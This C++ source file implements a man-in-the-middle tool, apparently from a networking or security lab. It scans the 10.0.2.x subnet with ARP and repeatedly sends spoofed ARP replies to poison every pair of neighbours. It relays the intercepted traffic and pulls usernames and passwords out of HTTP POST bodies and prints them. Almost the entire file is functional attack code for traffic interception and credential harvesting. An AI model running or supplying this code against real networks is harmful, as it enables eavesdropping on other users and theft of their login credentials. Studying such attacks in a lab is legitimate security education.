#include <iostream>
#include <iomanip>
#include <string>
#include <sstream>
#include "../header/mitmAttack.h"
#include <unistd.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>


bool mitmAttack::checkIsHTTP(const uint8_t* buffer, int bufferSize)
{
    uint8_t* start = const_cast<uint8_t*>(buffer);
    size_t ethHdrSize = sizeof(ethhdr);
    if(bufferSize < ethHdrSize)
    {
        return false;
    }
    iphdr* ipHeader = reinterpret_cast<iphdr*>(start + ethHdrSize);
    uint8_t protocol = ipHeader->protocol;
    if(protocol != IPPROTO_TCP)
    {
        return false;
    }
    size_t ipHdrSize = ipHeader->ihl * 4;
    if(bufferSize < ethHdrSize + ipHdrSize)
    {
        return false;
    }
    tcphdr* tcpHeader = reinterpret_cast<tcphdr*>(start + ethHdrSize + ipHdrSize); 
    uint16_t port = ntohs(tcpHeader->dest);
    return (port == 80);
}
bool mitmAttack::checkIsDNS(const uint8_t* buffer, int bufferSize)
{
    uint8_t* start = const_cast<uint8_t*>(buffer);
    size_t ethHdrSize = sizeof(ethhdr);
    if(bufferSize < ethHdrSize)
    {
        return false;
    }
    iphdr* ipHeader = reinterpret_cast<iphdr*>(start + ethHdrSize);
    uint8_t protocol = ipHeader->protocol;
    if(protocol != IPPROTO_UDP)
    {
        return false;
    }
    size_t ipHdrSize = ipHeader->ihl * 4;
    if(bufferSize < ethHdrSize + ipHdrSize)
    {
        return false;
    }
    udphdr* udpHeader = reinterpret_cast<udphdr*>(start + ethHdrSize + ipHdrSize); 
    uint16_t port = ntohs(udpHeader->dest);
    return (port == 53);
}
std::string mitmAttack::getHTTPpayload(const uint8_t* buffer, int bufferSize)
{
    // we ignore buffer size check before TCP header since this function is called after checkIsHTTP
    uint8_t* start = const_cast<uint8_t*>(buffer);
    size_t ethHdrSize = sizeof(ethhdr);
    iphdr* ipHeader = reinterpret_cast<iphdr*>(start + ethHdrSize);
    // std::cout << "[INFO] getHTTPpayload: ipHeader->tot_len " << ntohs(ipHeader->tot_len) << std::endl;
    // std::cout << "[INFO] getHTTPpayload: bufferSize - ethHdrSize " << bufferSize - ethHdrSize << std::endl;
    if(ntohs(ipHeader->tot_len) > bufferSize - ethHdrSize) 
    {
        // actual size may larger than amount ip header record, because of padding
        // but it can't be smaller
        return "";
    }
    size_t ipHdrSize = ipHeader->ihl * 4;
    tcphdr* tcpHeader = reinterpret_cast<tcphdr*>(start + ethHdrSize + ipHdrSize); 
    size_t tcpHdrSize = tcpHeader->doff * 4;
    uint8_t* HTTPheader = start + ethHdrSize + ipHdrSize + tcpHdrSize;
    size_t HTTPSize = bufferSize - ethHdrSize - ipHdrSize - tcpHdrSize;
    std::stringstream ss;
    ss.write(reinterpret_cast<char*>(HTTPheader), HTTPSize);
    std::string HTTPline;
    getline(ss, HTTPline);
    // std::cerr << "[INFO] getHTTPpayload: HTTPline " << HTTPline << std::endl;
    if(HTTPline.find("POST") == std::string::npos)
    {
        return "";
    }
    while(HTTPline != "\r")
    {
        // std::cerr << "[INFO] getHTTPpayload: HTTPline " << HTTPline << std::endl;
        getline(ss, HTTPline);
    }
    std::string payload;
    while(getline(ss, HTTPline))
    {
        payload += HTTPline + "\n";
    }
    return payload;
}
void mitmAttack::extractHTTPpayload(std::string& payload)
{
    size_t start = payload.find("txtUsername=");
    size_t mid;
    if(start == std::string::npos)
    {
        return;
    }
    start += 12;
    mid = payload.find("&txtPassword=", start);
    if(mid == std::string::npos)
    {
        return;
    }
    std::string username = payload.substr(start, mid - start);
    start = mid + 13;
    std::string password = payload.substr(start);
    password.pop_back(); // remove last '\n'
    std::cout << "Username: " << username << std::endl;
    std::cout << "Password: " << password << std::endl;
}

void mitmAttack::setupSocket(const char* interface) {

    uint32_t ifIP = util::getIPOfInterface(interface);
    std::array<uint8_t, 6> ifMac = util::getMacOfInterface(interface);
    
    std::cerr << "[INFO] setupSocket: interface " << interface << " has ip " << util::ipToString(ifIP) << " and mac " << util::macToString(ifMac.data()) << std::endl;
    
    arp = arpSocket();
    arp.createSocket(interface);
    arp.setSourceAddress(ifIP, ifMac);

    ip = ipSocket();
    ip.createSocket(interface);
    ip.setSourceAddress(ifIP, ifMac);
    
}

void mitmAttack::getNeighbours() {
    arp.setTimeout(0, 10000); // 0.01 sec
    std::cout << "Scanning neighbours";
    std::cout.flush();
    for(int i = 1; i <= 254; i++)
    {
        if(i % 25 == 0)
        {
            std::cout << ".";
            std::cout.flush();
        }
        std::string targetIp = "10.0.2." + std::to_string(i);
        std::array<uint8_t, 6> mac = arp.getMacAddress(targetIp.c_str(), 1);
        if(mac == std::array<uint8_t, 6>{0, 0, 0, 0, 0, 0})
        {
            continue;
        }
        IPToMac[util::stringToIp(targetIp.c_str())] = mac;
    }
    std::cout << " Done!" << std::endl;
    std::cout << "Available devices: \n"
        "---------------------\n" 
        "IP Address\tMAC Address\n"
        "---------------------" << std::endl;
    for(auto& it : IPToMac) {
        std::cout << util::ipToString(it.first) << "\t";
        for(int i = 0; i < 6; i++) {
            std::cout << std::setw(2) << std::setfill('0') << 
                std::hex << (int)it.second[i];
            if(i != 5) {
                std::cout << ":";
            }
        }
        std::cout << std::dec << std::endl;
    }
    std::cout << std::endl;
    arp.setTimeout(0, 0); // reset timeout
}

void mitmAttack::poisonNeighbours() {
    while(true) {
        // bool recv = false;
        // arpPacket request;
        // sockaddr_ll sll;
        // if(arp.getArpRequest(&request, &sll, true)) {
        //     uint32_t targetIp = request.targetIp;
        //     uint32_t senderIp = request.senderIp;
        //     std::cerr << "[INFO] poisonNeighbours: received arp request from " << util::ipToString(senderIp) << " for " << util::ipToString(targetIp) << std::endl;
        //     for(int i = 0; i < 100; i++)
        //     {
        //         arp.sendArpReply(&request, &sll);
        //         usleep(100000); // 0.1 sec
        //     }
        // }

        if(IPToMac.size() == 0) {
            std::cerr << "[WARN] poisonNeighbours: no neighbours found" << std::endl;
            return;
        }
        for(auto& it : IPToMac) {
            for(auto& target : IPToMac) {
                if(it.first == target.first) {
                    continue;
                }
                // std::cerr << "[INFO] poisonNeighbours: sending arp reply to " << util::ipToString(it.first) << " for " << util::ipToString(target.first) << std::endl;
                arp.sendArpReply(target.second, target.first, it.first);
            }
        }
        sleep(1);
    }
}

void mitmAttack::processPackets(const char* interface) {
    uint32_t gatewayIp = util::getDefaultGateway(interface);
    std::array<uint8_t, 6> gatewayMac;
    if(IPToMac.find(gatewayIp) == IPToMac.end()) {
        util::errquit("processPackets: gateway not found");
    }
    gatewayMac = IPToMac[gatewayIp];
    
    uint8_t buffer[65536];
    size_t bufferSize = sizeof(buffer);

    while(true) 
    {
        int recvSize = ip.receivePacketToMe(buffer, bufferSize);
        ethhdr* ethHeader = reinterpret_cast<ethhdr*>(buffer);
        iphdr* ipHeader = reinterpret_cast<iphdr*>(buffer + sizeof(ethhdr));
        uint32_t destIp = ipHeader->daddr;
        if(ip.checkNeedRedirect(ipHeader))
        {
            // std::cerr << "[INFO] processPackets: received packet from " << util::ipToString(ipHeader->saddr) << " to " << util::ipToString(ipHeader->daddr) << std::endl;
            // std::cerr << "[INFO] processPackets: redirecting packet to " << util::ipToString(destIp) << std::endl;
            std::array<uint8_t, 6> trueDestMac;
            if (IPToMac.find(destIp) == IPToMac.end()) {
                trueDestMac = gatewayMac;
            }
            else
            {
                trueDestMac = IPToMac[destIp];
            }
            ip.redirectPacket(buffer, trueDestMac);

            if(checkIsHTTP(buffer, recvSize))
            {
                // std::cerr << "[INFO] processPackets: HTTP packet found" << std::endl;
                std::string payload = getHTTPpayload(buffer, recvSize);
                extractHTTPpayload(payload);
            }

        }
    }
}
